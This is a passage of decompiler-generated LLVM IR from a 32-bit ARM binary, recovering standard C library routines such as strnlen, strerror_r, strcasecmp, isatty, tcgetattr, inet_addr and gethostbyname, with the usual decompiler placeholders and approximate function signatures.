  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_ca70, { 1, 0 }
  uselistorder i32 %v0_ca6c, { 1, 0 }
  uselistorder i32 %v6_ca58, { 0, 2, 1 }
  uselistorder i32 %v1_ca48, { 2, 1, 0 }
  uselistorder i32 %v2_ca38, { 2, 1, 0 }
  uselistorder i32 %v1_ca28, { 1, 0 }
  uselistorder i32 %v0_ca24, { 1, 0 }
  uselistorder i32 %v6_ca18, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %dec_label_pc_ca68, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_ca7c = load i32, i32* @r1, align 4
  %v2_ca7c = icmp eq i32 %v0_ca7c, 0
  br i1 %v2_ca7c, label %bb, label %dec_label_pc_caac

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_ca94:                                ; preds = %dec_label_pc_cabc
  %v3_ca94 = icmp uge i32 %v5_cb48, %v1_ca94
  %v9_ca94 = icmp eq i32 %v5_cb48, %v1_ca94
  %v2_ca98 = xor i1 %v3_ca94, true
  %v3_ca98 = or i1 %v9_ca94, %v2_ca98
  br i1 %v3_ca98, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_ca94
  %v6_ca98 = sub i32 %v5_cb48, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_ca94, %bb19
  %v5_ca9c = phi i32 [ %v1_ca94, %dec_label_pc_ca94 ], [ %v6_ca98, %bb19 ]
  %v2_ca9c = xor i1 %v9_ca94, true
  %v3_ca9c = and i1 %v3_ca94, %v2_ca9c
  br i1 %v3_ca9c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_ca9c = sub i32 %v5_ca9c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_caa0 = phi i32 [ %v5_ca9c, %bb20 ], [ %v6_ca9c, %bb21 ]
  ret i32 %v8_caa0

dec_label_pc_caa4:                                ; preds = %dec_label_pc_caf0
  br label %dec_label_pc_cb44

dec_label_pc_caac:                                ; preds = %entry
  %v2_caac = add i32 %tmp, %v0_ca7c
  %v3_caac = icmp ult i32 %v2_caac, %tmp
  br i1 %v3_caac, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_caac
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_caac, %bb23
  %v5_cb48 = phi i32 [ %v2_caac, %dec_label_pc_caac ], [ -1, %bb23 ]
  %v1_cacc2 = urem i32 %tmp, 4
  %v2_cacc3 = icmp eq i32 %v1_cacc2, 0
  br i1 %v2_cacc3, label %dec_label_pc_cad4, label %dec_label_pc_cabc

dec_label_pc_cabc:                                ; preds = %bb24, %dec_label_pc_cac8
  %v1_ca94 = phi i32 [ %v1_cac8, %dec_label_pc_cac8 ], [ %tmp, %bb24 ]
  %v1_cabc = inttoptr i32 %v1_ca94 to i8*
  %v2_cabc = load i8, i8* %v1_cabc, align 1
  %v2_cac0 = icmp eq i8 %v2_cabc, 0
  br i1 %v2_cac0, label %dec_label_pc_ca94, label %dec_label_pc_cac8

dec_label_pc_cac8:                                ; preds = %dec_label_pc_cabc
  %v1_cac8 = add i32 %v1_ca94, 1
  %v1_cacc = urem i32 %v1_cac8, 4
  %v2_cacc = icmp eq i32 %v1_cacc, 0
  br i1 %v2_cacc, label %dec_label_pc_cad4, label %dec_label_pc_cabc

dec_label_pc_cad4:                                ; preds = %dec_label_pc_cac8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_cac8, %dec_label_pc_cac8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_cb3432 = icmp ult i32 %storemerge.lcssa, %v5_cb48
  br i1 %v3_cb3432, label %dec_label_pc_cadc, label %dec_label_pc_cb44

dec_label_pc_cadc:                                ; preds = %dec_label_pc_cb30, %dec_label_pc_cad4
  %v0_caa439 = phi i32 [ %v4_cadc, %dec_label_pc_cb30 ], [ %storemerge.lcssa, %dec_label_pc_cad4 ]
  %v1_cadc = inttoptr i32 %v0_caa439 to i32*
  %v2_cadc = load i32, i32* %v1_cadc, align 4
  %v4_cadc = add i32 %v0_caa439, 4
  store i32 %v4_cadc, i32* @lr, align 4
  %v2_cae0 = add i32 %v2_cadc, -16843009
  %v2_cae4 = and i32 %v2_cae0, -2139062144
  %v2_cae8 = icmp eq i32 %v2_cae4, 0
  br i1 %v2_cae8, label %dec_label_pc_cb30, label %dec_label_pc_caf0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cadc
  %v2_caf0 = inttoptr i32 %v0_caa439 to i8*
  %v3_caf0 = load i8, i8* %v2_caf0, align 1
  %v2_caf8 = icmp eq i8 %v3_caf0, 0
  %v1_cafc = add i32 %v0_caa439, 1
  br i1 %v2_caf8, label %dec_label_pc_caa4, label %dec_label_pc_cb04

dec_label_pc_cb04:                                ; preds = %dec_label_pc_caf0
  %v2_cb04 = inttoptr i32 %v1_cafc to i8*
  %v3_cb04 = load i8, i8* %v2_cb04, align 1
  %v2_cb08 = icmp eq i8 %v3_cb04, 0
  br i1 %v2_cb08, label %dec_label_pc_cb44, label %dec_label_pc_cb10

dec_label_pc_cb10:                                ; preds = %dec_label_pc_cb04
  %v1_cb10 = add i32 %v0_caa439, 2
  %v2_cb10 = inttoptr i32 %v1_cb10 to i8*
  %v3_cb10 = load i8, i8* %v2_cb10, align 1
  %v2_cb14 = icmp eq i8 %v3_cb10, 0
  br i1 %v2_cb14, label %dec_label_pc_cb44, label %dec_label_pc_cb20

dec_label_pc_cb20:                                ; preds = %dec_label_pc_cb10
  %v1_cb20 = add i32 %v0_caa439, 3
  %v2_cb20 = inttoptr i32 %v1_cb20 to i8*
  %v3_cb20 = load i8, i8* %v2_cb20, align 1
  %v2_cb24 = icmp eq i8 %v3_cb20, 0
  br i1 %v2_cb24, label %dec_label_pc_cb44, label %dec_label_pc_cb30

dec_label_pc_cb30:                                ; preds = %dec_label_pc_cadc, %dec_label_pc_cb20
  %v3_cb34 = icmp ult i32 %v4_cadc, %v5_cb48
  br i1 %v3_cb34, label %dec_label_pc_cadc, label %dec_label_pc_cb44

dec_label_pc_cb44:                                ; preds = %dec_label_pc_cb30, %dec_label_pc_cad4, %dec_label_pc_cb04, %dec_label_pc_cb10, %dec_label_pc_cb20, %dec_label_pc_caa4
  %v1_cb44 = phi i32 [ %v0_caa439, %dec_label_pc_caa4 ], [ %storemerge.lcssa, %dec_label_pc_cad4 ], [ %v1_cafc, %dec_label_pc_cb04 ], [ %v1_cb10, %dec_label_pc_cb10 ], [ %v1_cb20, %dec_label_pc_cb20 ], [ %v5_cb48, %dec_label_pc_cb30 ]
  %v3_cb44 = icmp uge i32 %v5_cb48, %v1_cb44
  %v9_cb44 = icmp eq i32 %v5_cb48, %v1_cb44
  %v2_cb48 = xor i1 %v3_cb44, true
  %v3_cb48 = or i1 %v9_cb44, %v2_cb48
  br i1 %v3_cb48, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_cb44
  %v6_cb48 = sub i32 %v5_cb48, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_cb44, %bb25
  %v5_cb4c = phi i32 [ %v1_cb44, %dec_label_pc_cb44 ], [ %v6_cb48, %bb25 ]
  %v2_cb4c = xor i1 %v9_cb44, true
  %v3_cb4c = and i1 %v3_cb44, %v2_cb4c
  br i1 %v3_cb4c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_cb4c = sub i32 %v5_cb4c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_cb50 = phi i32 [ %v5_cb4c, %bb26 ], [ %v6_cb4c, %bb27 ]
  ret i32 %v8_cb50

; uselistorder directives
  uselistorder i1 %v3_cb44, { 1, 0 }
  uselistorder i32 %v4_cadc, { 1, 2, 0 }
  uselistorder i32 %v0_caa439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_cac8, { 1, 0, 2 }
  uselistorder i32 %v1_ca94, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_cb48, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_ca94, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_cb44, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_cb30, { 1, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_cb64 = call i32 @__xpg_strerror_r()
  %v0_cb68 = load i32, i32* @r4, align 4
  ret i32 %v0_cb68
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_cb70 = load i32, i32* @r4, align 4
  %v0_cb74 = load i32, i32* @r0, align 4
  %v0_cb80 = load i32, i32* @r1, align 4
  store i32 %v0_cb80, i32* @r8, align 4
  %v0_cb84 = load i32, i32* @r2, align 4
  store i32 %v0_cb84, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_cb74, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_cbbc

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_137cc.512 to i32), i32* @r5, align 4
  %v2_cba43446 = icmp eq i32 %v0_cb74, 0
  br i1 %v2_cba43446, label %bb26, label %dec_label_pc_cb98.lr.ph

dec_label_pc_cb98:                                ; preds = %dec_label_pc_cb98.lr.ph, %bb
  %v2_cbb041 = phi i1 [ %v2_cbb03849, %dec_label_pc_cb98.lr.ph ], [ %v2_cbb0, %bb ]
  %v1_cbb440 = phi i32 [ %v0_cba4.pr48, %dec_label_pc_cb98.lr.ph ], [ %v2_cba0, %bb ]
  %v0_cb9c39 = phi i32 [ %v0_cba8547, %dec_label_pc_cb98.lr.ph ], [ %v1_cb9c, %bb ]
  %v1_cb9c = add i32 %v0_cb9c39, 1
  store i32 %v1_cb9c, i32* @r5, align 4
  br i1 %v2_cbb041, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_cb98
  %v2_cba0 = add i32 %v1_cbb440, -1
  %v2_cba4 = icmp eq i32 %v2_cba0, 0
  %v1_cba8 = inttoptr i32 %v1_cb9c to i8*
  %v2_cba8 = load i8, i8* %v1_cba8, align 1
  %v2_cbb0 = icmp eq i8 %v2_cba8, 0
  br i1 %v2_cba4, label %dec_label_pc_cbb0, label %dec_label_pc_cb98

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_cb98
  %v1_cba835 = inttoptr i32 %v1_cb9c to i8*
  %v2_cba836 = load i8, i8* %v1_cba835, align 1
  %v2_cbb038 = icmp eq i8 %v2_cba836, 0
  br label %dec_label_pc_cb98.lr.ph

dec_label_pc_cb98.lr.ph:                          ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_cbb03849 = phi i1 [ %v2_cbb038, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_cba4.pr48 = phi i32 [ %v1_cbb440, %thread-pre-split.loopexit ], [ %v0_cb74, %thread-pre-split.preheader ]
  %v0_cba8547 = phi i32 [ %v1_cb9c, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_137cc.512 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_cb98

dec_label_pc_cbb0:                                ; preds = %bb
  br i1 %v2_cbb0, label %dec_label_pc_cbbc, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_cbb0
  %v0_cb9c.lcssa55 = phi i32 [ %v1_cb9c, %dec_label_pc_cbb0 ], [ ptrtoint ([8 x i8]* @global_var_137cc.512 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbbc:                                ; preds = %dec_label_pc_cbb0, %entry
  %v3_cbc0 = ashr i32 %v0_cb74, 31
  %v5_cbd4 = bitcast i32* %stack_var_-25 to i8*
  %v6_cbd4 = call i32 @_uintmaxtostr(i8* %v5_cbd4, i32 %v0_cb74, i32 %v3_cbc0, i32 -10, i32 0)
  %v1_cbd8 = add i32 %v6_cbd4, -14
  store i32 %v1_cbd8, i32* @r5, align 4
  store i32 %v1_cbd8, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_137bc.514 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_cbe8 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_cbf0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_cbf0

dec_label_pc_cbf0:                                ; preds = %bb26, %dec_label_pc_cbbc
  %v0_cbf0 = phi i32 [ %v0_cb9c.lcssa55, %bb26 ], [ %v0_cbf0.pre, %dec_label_pc_cbbc ]
  %v1_cbf0 = inttoptr i32 %v0_cbf0 to i8*
  %v3_cbf4 = call i32 @strlen(i8* %v1_cbf0)
  %v0_cbf8 = load i32, i32* @r8, align 4
  %v2_cbf8 = icmp eq i32 %v0_cbf8, 0
  %v1_cbfc = add i32 %v3_cbf4, 1
  store i32 %v1_cbfc, i32* @r4, align 4
  br i1 %v2_cbf8, label %bb27, label %dec_label_pc_cbf0._crit_edge

dec_label_pc_cbf0._crit_edge:                     ; preds = %dec_label_pc_cbf0
  %v1_cc04.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_cbf0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_cbf0._crit_edge, %bb27
  %v4_cc08 = phi i32 [ %v1_cc04.pre, %dec_label_pc_cbf0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_cbfc, %v4_cc08
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_cc08, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_cc1814 = phi i32 [ %v4_cc08, %bb29 ], [ %v1_cbfc, %bb28 ]
  %v2_cc10 = icmp eq i32 %v0_cc1814, 0
  br i1 %v2_cc10, label %dec_label_pc_cc34, label %dec_label_pc_cc18

dec_label_pc_cc18:                                ; preds = %.thread16
  store i32 %v0_cc1814, i32* @r2, align 4
  %v0_cc1c = load i32, i32* @r5, align 4
  store i32 %v0_cc1c, i32* @r1, align 4
  store i32 %v0_cbf8, i32* @r0, align 4
  %v0_cc24 = call i32 @memcpy()
  %v0_cc28 = load i32, i32* @r8, align 4
  %v1_cc28 = load i32, i32* @r4, align 4
  %v2_cc28 = add i32 %v1_cc28, %v0_cc28
  %v3_cc30 = add i32 %v2_cc28, -1
  %v4_cc30 = inttoptr i32 %v3_cc30 to i8*
  store i8 0, i8* %v4_cc30, align 1
  br label %dec_label_pc_cc34

dec_label_pc_cc34:                                ; preds = %.thread16, %dec_label_pc_cc18
  %v0_cc34 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc34 = icmp eq i32 %v0_cc34, 0
  br i1 %v2_cc34, label %dec_label_pc_cc44, label %dec_label_pc_cc3c

dec_label_pc_cc3c:                                ; preds = %dec_label_pc_cc34
  %v0_cc3c = call i32 @__errno_location()
  %v0_cc40 = load i32, i32* %r7.global-to-local, align 4
  %v2_cc40 = inttoptr i32 %v0_cc3c to i32*
  store i32 %v0_cc40, i32* %v2_cc40, align 4
  %v0_cc44.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_cc44

dec_label_pc_cc44:                                ; preds = %dec_label_pc_cc34, %dec_label_pc_cc3c
  %v0_cc44 = phi i32 [ 0, %dec_label_pc_cc34 ], [ %v0_cc44.pre, %dec_label_pc_cc3c ]
  store i32 %v3_cb70, i32* @r4, align 4
  ret i32 %v0_cc44

; uselistorder directives
  uselistorder i32 %v4_cc08, { 1, 2, 0 }
  uselistorder i32 %v1_cbfc, { 1, 0, 2 }
  uselistorder i32 %v1_cb9c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_cb74, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 4, 3, 0, 1, 5 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 1, 0 }
  uselistorder label %dec_label_pc_cc44, { 1, 0 }
  uselistorder label %dec_label_pc_cc34, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_cbf0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_cc68

dec_label_pc_cc68:                                ; preds = %bb8, %entry
  %v8_cccc3 = phi i32 [ %v8_cccc, %bb8 ], [ 0, %entry ]
  %v0_ccc0 = phi i32 [ %v1_ccc0, %bb8 ], [ %arg2, %entry ]
  %v0_ccc4 = phi i32 [ %v1_ccc4, %bb8 ], [ %tmp, %entry ]
  %v9_cc68 = icmp eq i32 %v0_ccc4, %v0_ccc0
  br i1 %v9_cc68, label %dec_label_pc_cc68._crit_edge, label %dec_label_pc_cc70

dec_label_pc_cc68._crit_edge:                     ; preds = %dec_label_pc_cc68
  %.pre = inttoptr i32 %v0_ccc0 to i8*
  br label %bb8

dec_label_pc_cc70:                                ; preds = %dec_label_pc_cc68
  %v1_cc74 = inttoptr i32 %v0_ccc4 to i8*
  %v2_cc74 = load i8, i8* %v1_cc74, align 1
  %v3_cc74 = zext i8 %v2_cc74 to i32
  %v1_cc78 = inttoptr i32 %v0_ccc0 to i8*
  %v2_cc78 = load i8, i8* %v1_cc78, align 1
  %v3_cc78 = zext i8 %v2_cc78 to i32
  %v2_cc7c = load i32, i32* bitcast (i32** @global_var_1d7ac.516 to i32*), align 4
  %v2_cc80 = mul nuw nsw i32 %v3_cc74, 2
  store i32 %v2_cc80, i32* @ip, align 4
  %v2_cc84 = mul nuw nsw i32 %v3_cc78, 2
  %v2_cc88 = add i32 %v2_cc84, %v2_cc7c
  %v2_cc8c = add i32 %v2_cc7c, %v2_cc80
  %v1_cc90 = add i32 %v2_cc8c, 1
  %v2_cc90 = inttoptr i32 %v1_cc90 to i8*
  %v3_cc90 = load i8, i8* %v2_cc90, align 1
  %v4_cc90 = zext i8 %v3_cc90 to i32
  %v1_cc94 = add i32 %v2_cc88, 1
  %v2_cc94 = inttoptr i32 %v1_cc94 to i8*
  %v3_cc94 = load i8, i8* %v2_cc94, align 1
  %v4_cc94 = zext i8 %v3_cc94 to i32
  %v3_cc98 = inttoptr i32 %v2_cc88 to i8*
  %v4_cc98 = load i8, i8* %v3_cc98, align 1
  %v6_cc98 = zext i8 %v4_cc98 to i32
  %v3_cc9c = inttoptr i32 %v2_cc8c to i8*
  %v4_cc9c = load i8, i8* %v3_cc9c, align 1
  %v6_cc9c = zext i8 %v4_cc9c to i32
  %v3_cca0 = mul nuw i32 %v4_cc94, 16777216
  %v3_cca4 = mul nuw i32 %v4_cc90, 16777216
  %v4_cca8 = sdiv i32 %v3_cca4, 65536
  %v5_cca8 = or i32 %v6_cc9c, %v4_cca8
  %v4_ccac = sdiv i32 %v3_cca0, 65536
  %v5_ccac = or i32 %v4_ccac, %v6_cc98
  %v2_ccb0 = sub nsw i32 %v5_cca8, %v5_ccac
  %v9_ccb0 = icmp eq i32 %v5_cca8, %v5_ccac
  br i1 %v9_ccb0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_cc70
  ret i32 %v2_ccb0

bb8:                                              ; preds = %dec_label_pc_cc68._crit_edge, %dec_label_pc_cc70
  %v1_ccb8.pre-phi = phi i8* [ %.pre, %dec_label_pc_cc68._crit_edge ], [ %v1_cc74, %dec_label_pc_cc70 ]
  %v8_cccc = phi i32 [ %v8_cccc3, %dec_label_pc_cc68._crit_edge ], [ %v2_ccb0, %dec_label_pc_cc70 ]
  %v2_ccb8 = load i8, i8* %v1_ccb8.pre-phi, align 1
  %v2_ccbc = icmp eq i8 %v2_ccb8, 0
  %v1_ccc0 = add i32 %v0_ccc0, 1
  %v1_ccc4 = add i32 %v0_ccc4, 1
  store i32 %v1_ccc4, i32* @lr, align 4
  br i1 %v2_ccbc, label %dec_label_pc_cccc, label %dec_label_pc_cc68

dec_label_pc_cccc:                                ; preds = %bb8
  ret i32 %v8_cccc

; uselistorder directives
  uselistorder i32 %v1_ccc4, { 1, 0 }
  uselistorder i32 %v2_ccb0, { 1, 0 }
  uselistorder i32 %v5_ccac, { 1, 0 }
  uselistorder i32 %v5_cca8, { 1, 0 }
  uselistorder i32 %v2_cc80, { 1, 0 }
  uselistorder i32 %v0_ccc0, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_1fc0c.518 to i32), i32* @r2, align 4
  %v0_ccd8 = call i32 @strtok_r()
  %v0_ccdc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ccdc, label %bb, label %bb1

bb:                                               ; preds = %entry
  %v2_ccdc = load i32, i32* @ip, align 4
  %v5_ccdc = mul i32 %v2_ccdc, 16777216
  %v6_ccdc = and i32 %v5_ccdc, %arg1
  call void @__pseudo_branch(i32 %v6_ccdc)
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_ccd8

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_cce4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_cce4, i32* @r1, align 4
  %v0_ccec = call i32 @__GI_tcgetattr()
  %v1_ccf0 = sub i32 1, %v0_ccec
  %v2_ccf0 = icmp ult i32 %v0_ccec, 2
  br i1 %v2_ccf0, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_ccfc = phi i32 [ %v1_ccf0, %entry ], [ 0, %bb ]
  ret i32 %v5_ccfc

; uselistorder directives
  uselistorder i32 %v0_ccec, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_cd00 = load i32, i32* @r4, align 4
  %v6_cd00 = load i32, i32* @r5, align 4
  %v2_cd04 = ptrtoint i32* %stack_var_-56 to i32
  %v0_cd08 = load i32, i32* @r1, align 4
  store i32 %v0_cd08, i32* %r6.global-to-local, align 4
  %v0_cd14 = load i32, i32* @r0, align 4
  %v3_cd14 = call i32 @ioctl(i32 %v0_cd14, i32 21505, i32 %v2_cd04)
  store i32 %v3_cd14, i32* %r7.global-to-local, align 4
  %v2_cd18 = icmp eq i32 %v3_cd14, 0
  %v2_cd20 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_cd20, i32* @r1, align 4
  %v0_cd28 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_cd18, label %dec_label_pc_cd30, label %dec_label_pc_cd5c

dec_label_pc_cd30:                                ; preds = %entry
  %v1_cd28 = add i32 %v0_cd28, 17
  %v4_cd38 = zext i8 %tmp to i32
  store i32 %v4_cd38, i32* @r5, align 4
  %v2_cd3c = load i32, i32* %stack_var_-56, align 4
  %v1_cd40 = inttoptr i32 %v0_cd28 to i32*
  store i32 %v2_cd3c, i32* %v1_cd40, align 4
  %v3_cd40 = add i32 %v0_cd28, 4
  %v4_cd40 = inttoptr i32 %v3_cd40 to i32*
  %v5_cd40 = load i32, i32* @ip, align 4
  store i32 %v5_cd40, i32* %v4_cd40, align 4
  %v6_cd40 = add i32 %v0_cd28, 8
  %v7_cd40 = inttoptr i32 %v6_cd40 to i32*
  %v8_cd40 = load i32, i32* @lr, align 4
  store i32 %v8_cd40, i32* %v7_cd40, align 4
  %v0_cd44 = load i32, i32* @r4, align 4
  %v1_cd44 = load i32, i32* %r6.global-to-local, align 4
  %v2_cd44 = add i32 %v1_cd44, 12
  %v3_cd44 = inttoptr i32 %v2_cd44 to i32*
  store i32 %v0_cd44, i32* %v3_cd44, align 4
  %v0_cd48 = load i32, i32* @r5, align 4
  %v1_cd48 = trunc i32 %v0_cd48 to i8
  %v2_cd48 = load i32, i32* %r6.global-to-local, align 4
  %v3_cd48 = add i32 %v2_cd48, 16
  %v4_cd48 = inttoptr i32 %v3_cd48 to i8*
  store i8 %v1_cd48, i8* %v4_cd48, align 1
  %v4_cd4c = call i32 @__GI_mempcpy(i32 %v1_cd28, i32 %v2_cd20, i32 19, i32 %v2_cd3c)
  %v0_cd50 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_cd58 = inttoptr i32 %v4_cd4c to i8*
  %v3_cd58 = call i32 @__GI_memset(i8* %v2_cd58, i32 %v0_cd50)
  br label %dec_label_pc_cd5c

dec_label_pc_cd5c:                                ; preds = %entry, %dec_label_pc_cd30
  %v0_cd5c = phi i32 [ %v3_cd14, %entry ], [ %v0_cd50, %dec_label_pc_cd30 ]
  store i32 %v3_cd00, i32* @r4, align 4
  store i32 %v6_cd00, i32* @r5, align 4
  ret i32 %v0_cd5c

; uselistorder directives
  uselistorder i32 %v0_cd28, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_cd5c, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cd88 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_cd88
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_cd98 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_cd9c = urem i32 %tmp1, 256
  %v5_cd9c = or i32 %v4_cd9c, %v1_cd98
  ret i32 %v5_cd9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_cdc0 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_cdc0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_cdd0 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_cdd4 = urem i32 %tmp1, 256
  %v5_cdd4 = or i32 %v4_cdd4, %v1_cdd0
  ret i32 %v5_cdd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_cde0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_cde8 = load i32, i32* @r0, align 4
  %v2_cde8 = inttoptr i32 %v0_cde8 to i8*
  %v3_cde8 = call i32 @inet_aton(i8* %v2_cde8, i32 %v2_cde0)
  %v2_cdec = icmp eq i32 %v3_cde8, 0
  br i1 %v2_cdec, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_cdf4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_cdfc = phi i32 [ -1, %entry ], [ %v3_cdf4, %bb ]
  ret i32 %v5_cdfc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_ce00 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_ce0c = call i32 @__GI___h_errno_location()
  %v2_ce10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_ce10, i32* @ip, align 4
  %v0_ce1c = load i32, i32* @r4, align 4
  %v7_ce2c = call i32 @gethostbyname_r(i32 %v0_ce1c, i32* nonnull @global_var_1fddc.521, i32 ptrtoint (i32* @global_var_1fc10.523 to i32), i32 460, i32 %v2_ce10, i32 %v0_ce0c)
  %v3_ce30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_ce00, i32* @r4, align 4
  ret i32 %v3_ce30
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
